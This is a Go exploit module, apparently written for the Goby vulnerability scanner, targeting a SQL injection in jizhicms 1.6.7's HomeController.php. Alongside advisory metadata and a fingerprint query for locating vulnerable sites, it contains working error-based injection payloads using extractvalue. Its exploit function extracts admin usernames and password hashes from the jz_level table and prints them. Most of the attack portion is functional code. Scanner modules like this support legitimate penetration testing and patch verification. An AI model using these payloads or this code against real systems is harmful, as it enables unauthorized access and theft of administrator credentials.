package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"math/rand"
	"regexp"
	"strings"
	"time"
)
func init() {
	expJson := `{
    "Name": "jizhicms HomeController.php sql injection vulnerability",
    "Description": "<p>jizhicms is an open source and free phpcms website content management system.</p><p>SQL injection exists in \\Home\\c\\HomeController.php in jizhicms 1.6.7. Attackers can obtain sensitive information such as background account password through SQL injection.</p>",
    "Product": "jizhicms",
    "Homepage": "https://www.jizhicms.cn/",
    "DisclosureDate": "2022-08-21",
    "Author": "hututuZH",
    "FofaQuery": "body=\"static/cms/static/css/gordita-fonts.css\" || body=\"极致CMS\"",
    "GobyQuery": "body=\"static/cms/static/css/gordita-fonts.css\" || body=\"极致CMS\"",
    "Level": "2",
    "Impact": "<p>SQL injection exists in \\Home\\c\\HomeController.php in jizhicms 1.6.7. Attackers can obtain sensitive information such as background account password through SQL injection.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:https://www.jizhicms.cn/forum.php?mod=viewthread&amp;tid=646</p>",
    "References": [
        "https://blog.csdn.net/xiaoguaiii/article/details/108025600"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "/'and%20extractvalue(1,%20concat(0x3a,(SELECT(group_concat(name))FROM(jz_level))))%20and%20%20'1'='1"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2020-32211"
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "极致 cms HomeController.php sql 注入漏洞",
            "Product": "极致CMS",
            "Description": "<p>极致CMS是开源免费的PHPCMS网站内容管理系统。</p><p>极致CMS1.6.7版本在\\Home\\c\\HomeController.php存在sql注入，攻击者可以通过sql注入获得后台账号密码等敏感信息。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.jizhicms.cn/forum.php?mod=viewthread&amp;tid=646\">https://www.jizhicms.cn/forum.php?mod=viewthread&amp;tid=646</a><br></p>",
            "Impact": "<p>极致CMS1.6.7版本在\\Home\\c\\HomeController.php存在sql注入，攻击者可以通过sql注入获得后台账号密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "jizhicms HomeController.php sql injection vulnerability",
            "Product": "jizhicms",
            "Description": "<p>jizhicms is an open source and free phpcms website content management system.</p><p>SQL injection exists in <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">\\Home\\c\\HomeController.php&nbsp;</span>in <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">jizhicms&nbsp;</span>1.6.7. Attackers can obtain sensitive information such as background account password through SQL injection.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://www.jizhicms.cn/forum.php?mod=viewthread&amp;tid=646\">https://www.jizhicms.cn/forum.php?mod=viewthread&amp;tid=646</a></span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">SQL injection exists in&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">\\Home\\c\\HomeController.php&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">in&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">jizhicms&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">1.6.7. Attackers can obtain sensitive information such as background account password through SQL injection.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10698"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			random := rand.New(rand.NewSource(time.Now().UnixNano()))

			//随机md5
			randomName := fmt.Sprintf("%02v", random.Int31n(100))
			uri := "/'and%20extractvalue(1,%20concat(0x3a,(select%20md5("+randomName+")),0x3a))%20and%20%20'1'='1"
			writeStr := md5.New()
			io.WriteString(writeStr, randomName)
			md5Str := fmt.Sprintf("%x", writeStr.Sum(nil))


			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, md5Str[:len(md5Str)-2])
			}
			return false
		},



		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sql := ss.Params["sql"].(string)

			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + sql); err == nil {

				uri :="/'and%20extractvalue(1,%20concat(0x3a,(SELECT(group_concat(pass))FROM(jz_level)),0x3a))%20and%20%20'1'='1"
				regularMatchUser,_ :=regexp.Compile("syntax error: ':(.*)?'S")
				userName:=regularMatchUser.FindString(resp.Utf8Html)[16:]

				if respName, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri); err == nil {

					regularMatchPass,_ :=regexp.Compile("syntax error: ':(.*)?'S")
					password:=regularMatchPass.FindString(respName.Utf8Html)[16:]
					expResult.Success = true
					expResult.Output ="username:"+userName[:len(userName)-2]+"\npassword:"+password[:len(password)-2]+"\n\n\n"+resp.RawBody
				}
			}
			return expResult
		},
	))
}